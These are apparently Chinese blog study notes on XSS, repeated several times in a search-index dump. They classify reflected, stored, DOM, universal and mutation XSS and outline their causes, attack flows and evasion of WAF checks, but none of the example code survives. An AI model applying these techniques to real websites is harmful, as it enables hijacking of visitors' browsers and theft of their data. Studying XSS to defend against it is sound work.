漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#1反射型xss非持久型"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#漏洞成因"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#攻击流程"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#2存储型xss持久型"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#漏洞成因-1"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#攻击流程-1"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 